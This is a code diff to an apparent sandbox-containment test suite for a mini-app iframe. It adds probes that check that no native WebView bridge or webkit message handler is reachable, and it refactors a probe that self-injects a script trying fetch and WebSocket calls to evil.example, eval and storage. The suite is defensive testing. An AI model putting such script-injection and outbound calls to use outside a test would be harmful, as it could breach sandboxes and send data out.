@@ -4,7 +4,7 @@
 // Productionized from the proven Spike-2 adversarial suite (removed from invariants/ in
 // 2026-09, see git history); the assertions are kept verbatim — this is
 // THE never-regress oracle (§16.2: "a bundle cannot reach the network or any native
-// capability except through the SDK"). It defines `__whimRunProbes()` → Promise<Result>.
+// capability except through the SDK"). It defines `__whimRunProbes(trusted)` → Promise<Result>.
 //
 // CONSTRAINT #3 (trusted vantage): a bundle sharing the iframe scope can OVERWRITE
 // `window.__whimRunProbes` (the evil fixture does, posting a forged 999/999). So the loader
@@ -12,7 +12,14 @@
 // and calls the captured ref — never `window.__whimRunProbes`. The verdict is therefore
 // computed from code the bundle cannot tamper with. PASS iff the dangerous thing throws / is
 // provably inert / unreachable; a "DID NOT THROW" is a containment failure.
-function __whimRunProbes() {
+// `trusted` is what only the loader's closure holds: `{ stub }`, its transport stub's identity.
+// `o`'s prototype; a throwing lookup ends the chain. A top-level `const`, not a function
+// declaration: a lexical binding is not a `window` property, so app code cannot overwrite it.
+const protoOf = function (o) {
+  'use strict';
+  try { return Object.getPrototypeOf(o); } catch (e) { return null; }
+};
+function __whimRunProbes(trusted) {
   'use strict';
   const results = [];
   function describe(v) {
@@ -104,6 +111,71 @@ function __whimRunProbes() {
   expectUnreachable('reach', 'window.parent.ReactNativeWebView (real bridge)', function () { return window.parent.ReactNativeWebView; });
   expectUnreachable('reach', 'window.top.ReactNativeWebView', function () { return window.top.ReactNativeWebView; });
 
+  // 5b. the frame's OWN bridge (sandbox-isolation "The mini-app frame holds no native bridge
+  // object"). neutralize.js removed any native bridge before the loader installed its stub; these
+  // check, as the app left the realm, that nothing but that stub is reachable. They only read: the
+  // stub the running app posts through is never deleted or replaced. The stub's identity comes
+  // from the loader's closure (`trusted.stub`), never from anything app code can write.
+  const loaderStub = trusted && typeof trusted === 'object' ? trusted.stub : undefined;
+  // Every object on `target`'s prototype chain holding `name` as an own property, with the value
+  // a read through it yields, and the depth it sits at (0 = target itself).
+  function holdersOf(target, name) {
+    const found = [];
+    for (let o = target, depth = 0; o !== null && o !== undefined && depth < 64; depth++) {
+      const desc = ownDescriptor(o, name);
+      if (desc) found.push({ depth: depth, value: readThrough(desc, target) });
+      o = protoOf(o);
+    }
+    return found;
+  }
+  // `o`'s own descriptor for `name`; a throwing lookup (a hostile proxy) yields none.
+  function ownDescriptor(o, name) {
+    try { return Object.getOwnPropertyDescriptor(o, name); } catch (e) { return undefined; }
+  }
+  // The value a read of `target[name]` yields through descriptor `desc`; a throwing getter yields
+  // nothing.
+  function readThrough(desc, target) {
+    if ('value' in desc) return desc.value;
+    if (!desc.get) return undefined;
+    try { return Reflect.apply(desc.get, target, []); } catch (e) { return undefined; }
+  }
+  function isNothing(v) { return v === null || v === undefined; }
+  (function () {
+    const holders = holdersOf(window, 'ReactNativeWebView');
+    const foreign = holders.filter(function (h) { return !isNothing(h.value) && h.value !== loaderStub; });
+    let detail;
+    if (loaderStub === undefined) {
+      detail = 'no captured loader stub to compare with';
+    } else if (foreign.length === 0) {
+      detail = 'own and inherited ReactNativeWebView resolve to the loader stub or nothing (' + holders.length + ' holder(s))';
+    } else {
+      detail = 'REACHED a bridge that is not the loader stub at prototype depth ' +
+        foreign.map(function (h) { return h.depth; }).join(',');
+    }
+    record('reach', 'frame bridge is the loader stub', loaderStub !== undefined && foreign.length === 0, detail);
+  })();
+  (function () {
+    const inherited = holdersOf(window, 'ReactNativeWebView').filter(function (h) { return h.depth > 0 && !isNothing(h.value); });
+    record('reach', 'no native bridge on the window prototype chain', inherited.length === 0,
+      inherited.length === 0
+        ? 'no prototype of window holds ReactNativeWebView'
+        : 'REACHED ReactNativeWebView on window prototype(s) at depth ' +
+          inherited.map(function (h) { return h.depth; }).join(','));
+  })();
+  // Every iOS message handler (react-native-webview's bridge and its history shim, and any other)
+  // sits on `webkit.messageHandlers`, whose entries WebKit does not enumerate: none is reachable only
+  // if no `webkit` on the window's chain yields a `messageHandlers` at all.
+  expectUnreachable('reach', 'webkit.messageHandlers unreachable', function () {
+    const webkits = holdersOf(window, 'webkit');
+    // Indexed, not for...of: the iterator protocol reads Array.prototype[Symbol.iterator], which
+    // app code has had the chance to replace by the time the probes run.
+    for (let i = 0; i < webkits.length; i++) {
+      const handlers = isNothing(webkits[i].value) ? undefined : webkits[i].value.messageHandlers;
+      if (!isNothing(handlers)) return handlers;
+    }
+    return undefined;
+  });
+
   // 6. module isolation: the resolvable runtime surface is EXACTLY {vc-sdk, react, react-dom};
   //    react/react-dom are host-injected externals (pure UI libs, no ambient authority), so
   //    resolving them is by design. EVERYTHING ELSE must throw. `require` is the H1b resolver.
@@ -130,38 +202,41 @@ function __whimRunProbes() {
   // same DOM-inserted-inline-script mechanism the loader uses is available to the bundle. A
   // fresh top-level scope must STILL see the poisoned window (the strip is window-level, not
   // lexical) and the CSP must still close codegen.
-  try {
-    try { delete window.__WHIM_T1; } catch (e) {}
-    const t1src =
-      'window.__WHIM_T1=(function(){var o={};' +
-      'o.fetchType=typeof fetch;' +
-      'try{fetch("https://evil.example/x");o.fetch="DID-NOT-THROW";}catch(e){o.fetch="threw:"+e.name;}' +
-      'try{new XMLHttpRequest();o.xhr="DID-NOT-THROW";}catch(e){o.xhr="threw:"+e.name;}' +
-      'try{new WebSocket("wss://evil.example");o.ws="DID-NOT-THROW";}catch(e){o.ws="threw:"+e.name;}' +
-      'try{localStorage.setItem("x","y");o.ls="DID-NOT-THROW";}catch(e){o.ls="threw:"+e.name;}' +
-      'try{new RTCPeerConnection();o.rtc="DID-NOT-THROW";}catch(e){o.rtc="threw:"+e.name;}' +
-      'try{new webkitRTCPeerConnection();o.wrtc="DID-NOT-THROW";}catch(e){o.wrtc="threw:"+e.name;}' +
-      'try{eval("1+1");o.eval="DID-NOT-THROW";}catch(e){o.eval="threw:"+e.name;}' +
-      'return o;})();';
-    const t1s = document.createElement('script');
-    t1s.textContent = t1src;
-    (document.head || document.documentElement).appendChild(t1s);
-    if (t1s.parentNode) t1s.parentNode.removeChild(t1s);
-    const t1 = window.__WHIM_T1;
-    if (!t1) {
-      record('pentest-T1', 'self-injected fresh <script> (did NOT execute)', true, 'fresh inline script blocked from running — no escape');
-    } else {
-      const t1blocked = t1.fetch.startsWith('threw:') && t1.xhr.startsWith('threw:') &&
-        t1.ws.startsWith('threw:') && t1.ls.startsWith('threw:') &&
-        t1.rtc.startsWith('threw:') && t1.wrtc.startsWith('threw:') && t1.eval.startsWith('threw:');
-      record('pentest-T1', 'self-injected fresh <script> reclaim globals', t1blocked,
-        (t1blocked ? 'ALL blocked in fresh scope → ' : 'ESCAPE → ') +
-        'fetch=' + t1.fetch + ' xhr=' + t1.xhr + ' ws=' + t1.ws +
-        ' ls=' + t1.ls + ' rtc=' + t1.rtc + ' wrtc=' + t1.wrtc + ' eval=' + t1.eval);
+  probeFreshScriptInjection();
+  function probeFreshScriptInjection() {
+    try {
+      try { delete window.__WHIM_T1; } catch (e) {}
+      const t1src =
+        'window.__WHIM_T1=(function(){var o={};' +
+        'o.fetchType=typeof fetch;' +
+        'try{fetch("https://evil.example/x");o.fetch="DID-NOT-THROW";}catch(e){o.fetch="threw:"+e.name;}' +
+        'try{new XMLHttpRequest();o.xhr="DID-NOT-THROW";}catch(e){o.xhr="threw:"+e.name;}' +
+        'try{new WebSocket("wss://evil.example");o.ws="DID-NOT-THROW";}catch(e){o.ws="threw:"+e.name;}' +
+        'try{localStorage.setItem("x","y");o.ls="DID-NOT-THROW";}catch(e){o.ls="threw:"+e.name;}' +
+        'try{new RTCPeerConnection();o.rtc="DID-NOT-THROW";}catch(e){o.rtc="threw:"+e.name;}' +
+        'try{new webkitRTCPeerConnection();o.wrtc="DID-NOT-THROW";}catch(e){o.wrtc="threw:"+e.name;}' +
+        'try{eval("1+1");o.eval="DID-NOT-THROW";}catch(e){o.eval="threw:"+e.name;}' +
+        'return o;})();';
+      const t1s = document.createElement('script');
+      t1s.textContent = t1src;
+      (document.head || document.documentElement).appendChild(t1s);
+      if (t1s.parentNode) t1s.parentNode.removeChild(t1s);
+      const t1 = window.__WHIM_T1;
+      if (!t1) {
+        record('pentest-T1', 'self-injected fresh <script> (did NOT execute)', true, 'fresh inline script blocked from running — no escape');
+      } else {
+        const t1blocked = t1.fetch.startsWith('threw:') && t1.xhr.startsWith('threw:') &&
+          t1.ws.startsWith('threw:') && t1.ls.startsWith('threw:') &&
+          t1.rtc.startsWith('threw:') && t1.wrtc.startsWith('threw:') && t1.eval.startsWith('threw:');
+        record('pentest-T1', 'self-injected fresh <script> reclaim globals', t1blocked,
+          (t1blocked ? 'ALL blocked in fresh scope → ' : 'ESCAPE → ') +
+          'fetch=' + t1.fetch + ' xhr=' + t1.xhr + ' ws=' + t1.ws +
+          ' ls=' + t1.ls + ' rtc=' + t1.rtc + ' wrtc=' + t1.wrtc + ' eval=' + t1.eval);
+      }
+      try { delete window.__WHIM_T1; } catch (e) {}
+    } catch (e) {
+      record('pentest-T1', 'self-injected fresh <script>', true, 'injection itself threw: ' + (e && e.name));
     }
-    try { delete window.__WHIM_T1; } catch (e) {}
-  } catch (e) {
-    record('pentest-T1', 'self-injected fresh <script>', true, 'injection itself threw: ' + (e && e.name));
   }
 
   // T3 — pivot from the injected SDK global / reachable loader machinery to codegen/host.
